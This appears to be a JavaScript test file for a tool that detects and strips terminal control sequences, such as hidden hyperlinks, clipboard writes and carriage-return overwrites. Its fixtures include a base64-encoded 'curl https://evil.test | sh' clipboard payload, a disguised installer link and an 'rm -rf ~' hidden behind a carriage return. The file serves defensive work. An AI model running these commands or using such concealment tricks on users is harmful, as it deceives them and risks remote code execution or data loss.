import test from 'node:test';
import assert from 'node:assert/strict';
import { BUILT_IN_RECIPES, applyRecipe, inspectText, visibleText } from '../src/core.js';

const safeTerminal = BUILT_IN_RECIPES.find((item) => item.id === 'safe-terminal');
const strip = (value) => applyRecipe(value, { name: 'Strip', rules: ['strip-terminal-controls'] }).output;
const labels = (value) => inspectText(value).terminalControls.map(({ label, length }) => `${label}/${length}`);
const ESC = '\x1b';
const BEL = '\x07';
const ST = `${ESC}\\`;

test('control sequences are reported whole, with a descriptive label', () => {
  assert.deepEqual(labels(`${ESC}[31mred${ESC}[0m`), ['terminal colour or style sequence/5', 'terminal colour or style sequence/4']);
  assert.deepEqual(labels(`${ESC}[2J${ESC}[1;1H`), ['terminal cursor or screen control sequence/4', 'terminal cursor or screen control sequence/6']);
  assert.deepEqual(labels(`${ESC}c${ESC}(B${ESC}7`), ['terminal escape sequence/2', 'terminal escape sequence/3', 'terminal escape sequence/2']);
});

test('terminal hyperlinks reveal their target and keep their visible text', () => {
  const value = `Run ${ESC}]8;;https://evil.test/install${BEL}the official installer${ESC}]8;;${BEL} now`;
  const [open, close] = inspectText(value).terminalControls;
  assert.equal(open.label, 'terminal hyperlink');
  assert.equal(open.detail, 'https://evil.test/install');
  assert.equal(close.label, 'terminal hyperlink end');
  assert.equal(strip(value), 'Run the official installer now');
  assert.equal(applyRecipe(value, safeTerminal).output, 'Run the official installer now');
});

test('clipboard writes, title changes and device strings are recognised and removed', () => {
  const payload = Buffer.from('curl https://evil.test | sh').toString('base64');
  const value = `a${ESC}]52;c;${payload}${BEL}b${ESC}]0;Innocent title${ST}c${ESC}Pq#0;2;0;0;0${ST}d${ESC}]52;c;?${BEL}e`;
  const findings = inspectText(value).terminalControls;
  assert.deepEqual(findings.map(({ label }) => label), ['terminal clipboard write', 'terminal title change', 'terminal device control string', 'terminal clipboard read request']);
  assert.equal(findings[0].detail, 'curl https://evil.test | sh');
  assert.equal(findings[1].detail, 'Innocent title');
  assert.equal(strip(value), 'abcde');
});

test('8-bit C1 controls are recognised', () => {
  const value = 'a\x9b31mb\x9d8;;https://x.test\x9cc\x85d';
  assert.deepEqual(inspectText(value).terminalControls.map(({ label }) => label), ['terminal colour or style sequence', 'terminal hyperlink', 'C1 control character']);
  assert.equal(strip(value), 'abcd');
});

test('backspaces and other C0 controls are named and removed', () => {
  const value = 'safe\b\b\b\bevil\x07\x7f';
  assert.deepEqual(inspectText(value).terminalControls.map(({ label }) => label), ['backspace', 'backspace', 'backspace', 'backspace', 'bell', 'delete control character']);
  assert.equal(strip(value), 'safeevil');
});

test('an unterminated string is flagged and its text is kept visible', () => {
  const value = `before${ESC}]0;the rest of this would vanish`;
  const [finding] = inspectText(value).terminalControls;
  assert.match(finding.label, /unterminated terminal operating system command/);
  assert.equal(strip(value), 'before0;the rest of this would vanish');
});

test('a lone carriage return is flagged only among LF line endings', () => {
  assert.deepEqual(labels('echo safe\rrm -rf ~\nnext'), ['carriage return without line feed/1']);
  assert.deepEqual(labels('old\rmac\rline endings'), []);
  assert.deepEqual(labels('windows\r\nline endings\r\n'), []);
  assert.equal(applyRecipe('echo safe\rrm -rf ~\nnext', safeTerminal).output, 'echo safe\nrm -rf ~\nnext');
});

test('the preview shows sequences and hyperlink targets', () => {
  const preview = visibleText(`${ESC}[31mred${ESC}]8;;https://evil.test${BEL}x${ESC}]8;;${BEL}\b`);
  assert.equal(preview, `⟦terminal colour or style sequence ${String.fromCharCode(0x241b)}[31m⟧red⟦terminal hyperlink: “https://evil.test”⟧x⟦terminal hyperlink end ${String.fromCharCode(0x241b)}]8;;${String.fromCharCode(0x2407)}⟧⟦backspace U+0008⟧`);
});

test('many unterminated sequences are processed in linear time', () => {
  const started = performance.now();
  const inspection = inspectText(`${ESC}]`.repeat(100_000) + `${ESC}P`.repeat(100_000));
  assert.equal(inspection.terminalControls.length, 1_000);
  strip(`${ESC}[`.repeat(200_000));
  assert.ok(performance.now() - started < 3_000);
});
